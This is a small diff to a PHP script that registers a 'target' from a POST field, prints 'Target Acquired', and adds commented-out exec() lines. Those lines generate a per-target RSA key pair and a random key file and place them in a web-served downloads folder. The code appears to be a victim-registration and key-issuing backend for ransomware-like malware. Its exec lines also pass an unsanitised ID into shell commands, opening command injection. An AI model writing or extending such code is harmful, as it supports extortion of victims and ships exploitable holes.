@@ -29,6 +29,9 @@ if (isset($_POST['uniqueID']) && !empty($_POST['uniqueID'])) {
 
    if ($conn->query($sqlStmt) === TRUE) {
        echo "Target Acquired";
+       //exec("openssl genrsa -out /tmp/$getTargetID.priv.pem 4096");
+       //exec("openssl rsa -pubout -in /tmp/$getTargetID.priv.pem -out /var/www/html/downloads/$getTargetID.pub.pem");
+       //exec("cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > /var/www/html/downloads/$getTargetID.key.bin");
    } else {
        echo "Error: " . $sqlStmt . "<br>" . $conn->error;
    }
